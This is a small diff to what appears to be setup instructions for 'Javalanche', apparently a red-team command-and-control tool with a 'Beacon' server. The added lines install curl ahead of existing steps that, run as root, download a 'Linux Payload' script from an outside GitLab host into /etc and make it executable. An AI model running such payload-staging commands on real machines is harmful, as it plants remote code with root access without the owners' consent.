@@ -61,6 +61,10 @@ $ sudo ./serverSetup.sh -server Beacon
 
 Linux Payload
 
+$ sudo apt update
+
+$ sudo apt install curl
+
 $ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
 
 $ sudo chmod +x /etc/javalanche.sh
